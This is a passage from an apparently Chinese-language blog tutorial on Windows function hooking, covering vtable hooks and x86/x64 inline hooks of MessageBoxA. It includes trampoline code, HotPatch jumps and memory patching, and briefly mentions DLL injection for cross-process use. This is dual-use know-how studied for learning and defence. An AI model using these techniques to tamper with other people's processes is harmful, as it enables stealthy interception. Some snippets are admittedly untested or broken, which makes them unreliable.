&amp;dwOldProtect);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步，将Detour函数地址写入到TargetClass的原始虚表TableToHook中<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//第二次修改，为了HookTarget函数，修改原始虚表</span></div><div class="line">VirtualProtect(vfTableToHook, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</div><div class="line">vfTableToHook[<span class="number">0</span>] = (ULONG_PTR)GetClassVirtualFnAddress(&amp;Detour, <span class="number">0</span>);</div><div class="line">printf(<span class="string">"[*]vfTableTrampoline=0x%x<span class="subst">\n</span>"</span>, vfTableToHook[<span class="number">0</span>]);</div><div class="line">VirtualProtect(vfTableToHook, sizeof(ULONG_PTR), dwOldProtect, &amp;dwOldProtect);</div></pre></td></tr></table></figure></p><h1 id="0x2-InlineHook"><a href="#0x2-InlineHook" class="headerlink" title="0x2 InlineHook"></a>0x2 InlineHook</h1><h2 id="0x2-1-InlineHook-A"><a href="#0x2-1-InlineHook-A" class="headerlink" title="0x2.1 InlineHook(A)"></a>0x2.1 InlineHook(A)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一类InlineHook是一类较为特殊的InlineHook，他修改的不是开始的多个字节，而是修改Target函数中call指令的地址。比如说VirtualAlloc函数中调用了VirtualAllocEx函数，这次inlineHook其实就是修改了VirtualAllocEx的地址(调用处的地址)，这样做的好处是可以避免被一些Hook检测工具检测。但是这样的缺点是兼容性不是很好，因为一些API的函数可能会因为系统的改变而改变。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (pTargetFun[<span class="number">0</span>] == <span class="number">0xE8</span>)</div><div class="line">&#123;</div><div class="line"><span class="comment">//获取VirtualAllocEx地址</span></div><div class="line">addrTemp = (<span class="keyword">ULONG</span>)pTargetFun + <span class="number">5</span> + *(<span class="keyword">LONG</span>*)(pTargetFun + <span class="number">1</span>);</div><div class="line"><span class="comment">//比较是否相同</span></div><div class="line"><span class="keyword">if</span> (addrTemp == addrTargetFun)</div><div class="line">&#123;</div><div class="line">bResult = <span class="keyword">TRUE</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">i++;</div><div class="line">pTargetFun++;</div><div class="line">&#125; <span class="keyword">while</span> (i &lt; <span class="number">0x30</span>);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果比较无误后修改DetourFun<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//保存修改的地址</span></div><div class="line">g_PointerToRawData = (<span class="keyword">ULONG</span>)(pTargetFun + <span class="number">1</span>);</div><div class="line"><span class="comment">//保存修改的内容</span></div><div class="line">g_RawOffset = *(<span class="keyword">ULONG</span>*)(pTargetFun + <span class="number">1</span>);</div><div class="line"><span class="comment">//保存Detour函数到Target函数的偏移量</span></div><div class="line">addrTemp= (<span class="keyword">LONG</span>)DetourVirtualAllocEx - (<span class="keyword">LONG</span>)pTargetFun - <span class="number">5</span></div><div class="line"><span class="comment">//修改</span></div><div class="line">bResult = WriteProcessMemory(GetCurrentProcess(), pTargetFun + <span class="number">1</span>, &amp;addrTemp, sizeof(<span class="keyword">LONG</span>), <span class="keyword">NULL</span>);</div></pre></td></tr></table></figure></p><h2 id="0x2-2-InlineHook-B"><a href="#0x2-2-InlineHook-B" class="headerlink" title="0x2.2 InlineHook(B)"></a>0x2.2 InlineHook(B)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种InlineHook修改的是Target函数前5个字节，这种做的好处是能够多版本进行HOOK，因为如果是采用上一种InlineHook，可能内部调用流程随着版本不同而不同，所以不容易Hook。而这种就没有这种缺点。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用InlineHook，需要了解到三种函数：</p><ul><li>Target函数：目标函数，我们选定的HOOK的函数</li><li>Detour函数：我们构造的函数，用于搭载HOOK完Target函数后，我们制定的操作</li><li>TrampolineFun函数：负责回调Target函数，在回调的时候，需要注意的时候重新执行HOOK修改的三条指令，并绕过HOOK的地方</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InlineHook主要的步骤就是修改Target函数的前五个字节。大概有以下几个步骤：</p><ul><li>Step1：构造Detour函数</li><li>Step2：构造TrampolineFun函数</li><li>Step3：获取TrampolineFun和HookPoint的地址。</li><li>Step4：填充需要修改的指令</li><li>Step5：使用ReadProcessMemory保存原指令</li><li>Step5：使用WriteProcessMemory修改Target函数指令</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然步骤看着简单，但是里面坑还是很多的。首先是构造构造Detour函数，<strong>这里需要注意的是Detour函数声明需要和Target函数保持一致，否则函数返回会异常</strong>,而且还要在DetourFun中还要调用TrampolineFun。</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//第一步设置Detour函数</span></div><div class="line"><span class="comment">//Detour函数的函数声明需要和Target函数保持一致，否则函数返回会异常</span></div><div class="line"><span class="keyword">int</span> WINAPI My_MessageBoxA(<span class="keyword">HWND</span> <span class="keyword">hWnd</span>, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</div><div class="line">&#123;</div><div class="line"><span class="comment">//修改操作</span></div><div class="line"><span class="keyword">int</span> iResult = <span class="number">0</span><span class="comment">;</span></div><div class="line">lpText = <span class="string">"Hooked"</span><span class="comment">;</span></div><div class="line">iResult = OriginalMessageBox(<span class="keyword">hWnd</span>, lpText, lpCaption, uType)<span class="comment">;</span></div><div class="line"><span class="comment">//修改返回值</span></div><div class="line">iResult = <span class="number">0</span><span class="comment">;</span></div><div class="line"><span class="keyword">return</span> iResult<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩是构造TrampolineFun函数，Trampoline函数是用于在Detour回调Target函数，在使用Trampoline首先执行Target被修改的三条指令，为了避免调用Target函数堆栈异常。然后使用jmp的方式跳转到Target函数中第四条指令，绕过被修改的指令，<strong>这是为了实现永久化</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//77D5050B &gt;  8BFF                   <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line">//77D5050D    <span class="number">55</span>                     <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">//77D5050E    8BEC                   <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line">/////////////</div><div class="line">__declspec( naked )</div><div class="line"><span class="keyword">int</span> WINAPI OriginalMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</div><div class="line">&#123;</div><div class="line">_asm</div><div class="line">&#123;</div><div class="line">//再次执行之前被修改的三条指令，避免堆栈异常</div><div class="line"><span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"><span class="keyword">jmp</span> MsgBoxHookData.JmpBackAddr  //跳转到Hook之后的地方，跳过自己安装的HOOK,实现持续化</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在正式HOOK开始，还需要填充一些关键的参数，为此，我们构造一个结构体。以便管理参数。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">HOOK_DATA</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="keyword">char</span> szApiName[<span class="number">128</span>];   <span class="comment">//TargetFun</span></div><div class="line"><span class="keyword">char</span> szModuleName[<span class="number">64</span>]; <span class="comment">//TargetModule</span></div><div class="line"><span class="keyword">int</span> HookCodelen;       <span class="comment">//HOOK长度</span></div><div class="line">BYTE oleEntry[<span class="number">16</span>];     <span class="comment">//保存HOOK原始指令</span></div><div class="line">BYTE newEntry[<span class="number">16</span>];     <span class="comment">//保存HOOK新指令</span></div><div class="line">ULONG_PTR HookPoint;   <span class="comment">//被HOOK的地址</span></div><div class="line">ULONG_PTR JmpBackAddr; <span class="comment">//回跳的地址，可以多次使用</span></div><div class="line">ULONG_PTR pfnTrampolineFun;    <span class="comment">//跳转到原函数执行的函数</span></div><div class="line">ULONG_PTR pfnDetourFun;   <span class="comment">//Detour函数</span></div><div class="line">&#125;HOOK_DATA,*PHOOK_DATA;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步是获取HookPoint和pfnTrampolineFun的地址，<strong>这一步的目的我也不是很清楚，但是我删除这两个指令，程序也是正常的。</strong>,接着设置回调点，这是为了在TrampolineFun中，设置跳转。<strong>回调点为了被修改指令之后</strong><br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//如果是跳转指令，获取跳转指令跟随的地址</span></div><div class="line"><span class="comment">//如果不是跳转指令，直接返回参数</span></div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span><span class="function"><span class="title">pfnTrampolineFun</span> = SkipJmpAddress(pHookData-&gt;</span>pfnTrampolineFun);</div><div class="line"><span class="comment">//HOOK点，是mov指令</span></div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>H<span class="function"><span class="title">ookPoint</span> = SkipJmpAddress(pHookData-&gt;</span>HookPoint);</div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>J<span class="function"><span class="title">mpBackAddr</span> = pHookData-&gt;</span>H<span class="function"><span class="title">ookPoint</span> + pHookData-&gt;</span>HookCodelen;</div><div class="line">ULONG_PTR SkipJmpAddress(ULONG_PTR uAddress)</div><div class="line">&#123;</div><div class="line">·······</div><div class="line"><span class="keyword">if</span> (pFn[<span class="number">0</span>] == <span class="number">0</span>xE9)</div><div class="line">&#123;</div><div class="line"><span class="comment">//目标地址-当前地址-5 = 偏移量</span></div><div class="line"><span class="comment">//(ULONG_PTR)pFn为当前地址</span></div><div class="line"><span class="comment">//*(ULONG_PTR*)(pFn + 1)为偏移量</span></div><div class="line">TrueAddress = (ULONG_PTR)pFn + *(ULONG_PTR*)(pFn + <span class="number">1</span>) + <span class="number">5</span>;</div><div class="line">return TrueAddress;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步是填充我们修改的指令<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//填充需要修改的内容</span></div><div class="line"><span class="function"><span class="title">pHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="number">0</span>xE9;    <span class="comment">//jmp</span></div><div class="line">*(ULONG*)(<span class="function"><span class="title">pHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG)pHookData-&gt;</span><span class="function"><span class="title">pfnDetourFun</span> - (ULONG)pHookData-&gt;</span>HookPoint - <span class="number">5</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第五步：使用ReadProcessMemory保存原指令以便恢复HOOK<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//保存原始数据到pHookData-&gt;oldEntry</span></div><div class="line"><span class="keyword">if</span> (!ReadProcessMemory(hProcess, (LPCVOID)pHookData-&gt;HookPoint, pHookData-&gt;oleEntry, pHookData-&gt;HookCodelen, &amp;dwBtyeReturned))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]ReadProcessMemory:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第六步：使用WriteProcessMemory修改前三条指令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, (LPVOID)pHookData-&gt;HookPoint, pHookData-&gt;newEntry, pHookData-&gt;HookCodelen, &amp;dwBtyeReturned))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>题外话：</strong>例程中给的是当前进程HOOK，如果是需要跨进程的话，需要将InlineHook包装成dll，然后使用注入技术注入到目标进程，才能实现HOOK。</p><h2 id="0x2-3-InlineHook-C"><a href="#0x2-3-InlineHook-C" class="headerlink" title="0x2.3 InlineHook(C)"></a>0x2.3 InlineHook(C)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在InlineHook(B)中，我们使用jmp指令跳转到Detour函数，这部分我们使用mov-jmp和push-ret，以及HotPatch的方法跳转到DetourFun。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先将跳转分为两种，第一种是一次性跳转，例如jmp，push-retn.mov-jmp等，第二种是HotPatch这种长短跳。对于第一种跳转比较简单，根据Hook的指令不同，可以选择长度为5.6.7不同的Hook指令。象jmp指令对应的是修改5个字节，而push-ret修改6个字节，mov-jmp修改的是七个字节。具体填充到HookPoint的数据如下：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//jmp （5个字节）</span></div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="string">'\xE9'</span>;</div><div class="line">*(ULONG_PTR*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG_PTR)MsgBoxHookData-&gt;</span><span class="function"><span class="title">pfnDetourFun</span> - (ULONG_PTR)MsgBoxHookData-&gt;</span>HookPoint - <span class="number">5</span>;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//push-retn  (6个字节)</span></div><div class="line"><span class="function"><span class="title">memcpy</span>(MsgBoxHookData-&gt;</span>newEntry, <span class="string">"\x68\x44\x33\x22\x11\xC3"</span>,<span class="number">5</span>);</div><div class="line">*(LONG_PTR*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG)MsgBoxHookData-&gt;</span>pfnDetourFun;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//mov-jmp (7个字节)</span></div><div class="line"><span class="function"><span class="title">memcpy</span>(MsgBoxHookData-&gt;</span>newEntry, <span class="string">"\xB8\x44\x33\x22\x11\xFF\xE0 "</span>, <span class="number">7</span>);</div><div class="line">*(LONG_PTR*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span><span class="function"><span class="title">newEntry</span> + 1) = (ULONG)MsgBoxHookData-&gt;</span>pfnDetourFun;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二种跳转是长短跳，也就是HotPatch的方法，由于标准函数调用存在两种形式，分别是不存在SEH，和存在SEH的。对于第二种12个字节指令，我们推荐使用Hotpatch的方法，原理如下：因为在API上面存在nop或者int3，这些指令通常是微软用于实现HotPatch的。可以使用长短跳结合的方式占用上方的nop实现Hook，步骤是这样的：1.使用短跳到HookPoint上面5个字节HotPatchCode处， 2.然后使用长跳到DetourFun。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//<span class="number">1</span>.不存在SEH</div><div class="line"><span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span>（<span class="number">5</span>个字节）</div><div class="line">//<span class="number">2</span>.存在SEH</div><div class="line"><span class="keyword">push</span> <span class="number">10</span></div><div class="line"><span class="keyword">push</span> xxxx</div><div class="line"><span class="keyword">call</span> xxx（<span class="number">2</span>+<span class="number">5</span>+<span class="number">5</span>）</div></pre></td></tr></table></figure></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//77D507E5   &gt;-/E9 66086B88      jmp InlineHo.00401050</span></div><div class="line"><span class="comment">//77D507EA &gt; $^\EB F9            jmp short USER32.77D507E5</span></div><div class="line"><span class="comment">//</span></div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>newEntry[<span class="number">0</span>] = <span class="number">0</span>xEB; <span class="comment">//Jmp -5</span></div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>newEntry[<span class="number">1</span>] = <span class="number">0</span>xF9;</div><div class="line">M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>HotPatchCode[<span class="number">0</span>] = <span class="number">0</span>xE9; <span class="comment">//Jmp</span></div><div class="line">*(ULONG*)(M<span class="function"><span class="title">sgBoxHookData</span>-&gt;</span>H<span class="function"><span class="title">otPatchCode</span> + 1) = (ULONG)MsgBoxHookData-&gt;</span><span class="function"><span class="title">pfnDetourFun</span> - ((ULONG)MsgBoxHookData-&gt;</span>HookPoint - <span class="number">5</span>) - <span class="number">5</span>;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InlineHook(C)属于InlineHook(B)的进阶版。所以基本步骤也是相同的。</p><ul><li>Step1：构造Detour函数和TrampolineFun</li><li>Step2：获取Detour和HookPoint的地址。</li><li>Step3：修改TrampolineFun处初始化的原指令</li><li>Step4：填充需要修改的指令</li><li>Step5：使用ReadProcessMemory保存原指令</li><li>Step5：使用WriteProcessMemory修改Target函数指令</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造Detour函数和构造TrampolineFun函数，以及填充修改的指令和之前是一致的，第三步是保存原始数据，这样做是为了以后能够将头几条指令填充TrampolineFun<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step3 保存原始数据</span></div><div class="line"><span class="comment">//jmp mov-jmp，push-ret三种方法和HotPatch大有不同，分开讨论</span></div><div class="line">SIZE_T lpNumberOfBytesRead = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)MsgBoxHookData-&gt;HookPoint, MsgBoxHookData-&gt;oldEntry, <span class="number">8</span>, &amp;lpNumberOfBytesRead))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]ReadProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步填充TrampolineFun函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (MsgBoxHookData-&gt;HookCodeLen != <span class="number">2</span>)</div><div class="line">&#123;</div><div class="line">SIZE_T lpNumberOfBytesWrite = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)MsgBoxHookData-&gt;pfnTrampolineFun, MsgBoxHookData-&gt;oldEntry, MsgBoxHookData-&gt;HookCodeLen, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第五步是向向HookPoint写入跳转数据，对于一次性跳转和之前是一致的，不再说明，重点是HotPatch。根据原理，在HookPaint处写入<code>\xE8\xF9</code>是跳转到EIP-5处也就是HotPatch处。可以在HookPoint前5个指令写入Hotpatch用于跳转到Detourfun，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//一次性跳转</span></div><div class="line">pAddrToWrite = (PBYTE)MsgBoxHookData-&gt;HookPoint;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), pAddrToWrite, MsgBoxHookData-&gt;newEntry, MsgBoxHookData-&gt;HookCodeLen, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">//[重点]HotPatch</span></div><div class="line"><span class="keyword">if</span> (MsgBoxHookData-&gt;HookCodeLen == <span class="number">2</span>)   <span class="comment">//[重点]HotPatch</span></div><div class="line">&#123;</div><div class="line">pAddrToWrite = (PBYTE)MsgBoxHookData-&gt;HookPoint - <span class="number">5</span>;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), pAddrToWrite, MsgBoxHookData-&gt;HotPatchCode, <span class="number">5</span>, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//达到需要写入的地址</span></div><div class="line">pAddrToWrite += <span class="number">5</span>;</div><div class="line"><span class="keyword">if</span> (!WriteProcessMemory(GetCurrentProcess(), pAddrToWrite, MsgBoxHookData-&gt;newEntry, MsgBoxHookData-&gt;HookCodeLen, &amp;lpNumberOfBytesWrite))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[*]WriteProcessMemory:%d"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x2-4-InlineHook-D-x64"><a href="#0x2-4-InlineHook-D-x64" class="headerlink" title="0x2.4 InlineHook(D)(x64)"></a>0x2.4 InlineHook(D)(x64)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一节主要讲x64下面的HOOK技术，和之前的x86下HOOK一样，都需要经历一下步骤：这一部分主要讲一下在X64位下面HOOK需要注意的地方。</p><ul><li>Step1：构造Detour函数</li><li>Step2：获取Detour和HookPoint的地址。</li><li>Step3：修改TrampolineFun处初始化的原指令</li><li>Step4：填充需要修改的指令</li><li>Step5：使用ReadProcessMemory保存原指令</li><li>Step5：使用WriteProcessMemory修改Target函数指令</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一点，就是在X86下可以直接写入一段shellcode到TrampolineFun。但是在x64下不能内联汇编了，所以申请一块内存用做TrampolineFun的shellcode。然后使用才能填充Trampoline。<strong>但是教主给的例程使用第二段代码做重定位，不知道作用是什么，但是使用这段代码在WIN10下HOOK MessageBoxA是不正确的，可能是填充Trampoline出现了意外。或者在填写跳转地址的时候少了一个字节，跳到了在正常的代码上面的一个int 3处，导致异常。</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">MsgBoxHookData.pfnTrampolineFun = (ULONG_PTR)VirtualAlloc(NULL, <span class="number">128</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line"><span class="comment">//...</span></div><div class="line">PBYTE pFun = (PBYTE)pHookData-&gt;pfnTrampolineFun;</div><div class="line">memcpy(pFun, (PVOID)(pHookData-&gt;HookPoint), <span class="number">14</span>);</div><div class="line">pFun += <span class="number">14</span>;</div><div class="line">pFun[<span class="number">0</span>] =<span class="number">0xFF</span>;</div><div class="line">pFun[<span class="number">1</span>] = <span class="number">0x25</span>;</div><div class="line">*(ULONG_PTR*)(pFun + <span class="number">6</span>) = pHookData-&gt;JmpBackAddr;</div></pre></td></tr></table></figure></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="regexp">//</span>由于第三行指令中有重定位数据，所以这里需要修复一下</div><div class="line"><span class="regexp">//</span>更好的办法是使用反汇编引擎来判断是否有重定位数据</div><div class="line"><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span 